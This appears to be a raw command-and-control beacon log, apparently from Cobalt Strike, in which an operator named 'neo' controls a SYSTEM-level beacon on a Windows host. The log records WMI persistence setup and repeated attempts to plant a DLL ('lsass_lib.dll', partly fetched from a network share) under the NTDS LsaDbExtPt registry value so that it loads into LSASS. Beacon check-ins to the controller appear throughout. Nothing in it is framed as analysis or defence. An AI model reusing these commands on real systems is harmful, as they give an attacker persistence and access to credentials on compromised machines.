01/27 10:43:54 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 2336; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/27 10:46:05 [task] 4*************进行vmi启动**********
01/27 10:46:05 [task] 执行代码
01/27 10:46:53 [checkin] host called home, sent: 673 bytes
01/27 10:47:02 [output]
received output:
ERROR:
Description = Object or property already exists


01/27 10:47:02 [output]
received output:
Instance creation successful.


01/27 10:47:02 [output]
received output:
Instance creation successful.


01/27 10:51:06 [task] 4*************LSA Disver************
01/27 10:51:06 [task] 执行代码
01/27 10:52:02 [checkin] host called home, sent: 326 bytes
01/27 10:52:02 [error] could not spawn New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
01/27 10:52:02 [error] could not spawn set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
01/27 10:54:50 [task] 4*************LSA Disver************
01/27 10:54:50 [task] 执行代码
01/27 10:55:02 [checkin] host called home, sent: 326 bytes
01/27 10:55:02 [error] could not spawn New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
01/27 10:55:02 [error] could not spawn set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
01/27 10:56:42 [input] <neo> exit
01/27 10:56:42 [task] Tasked beacon to exit
01/27 10:57:04 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 2336; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/27 10:57:02 [checkin] host called home, sent: 8 bytes
01/27 10:57:02 [output]
beacon exit.

01/27 11:35:12 [input] <neo> jobs
01/27 11:35:12 [task] Tasked beacon to list jobs
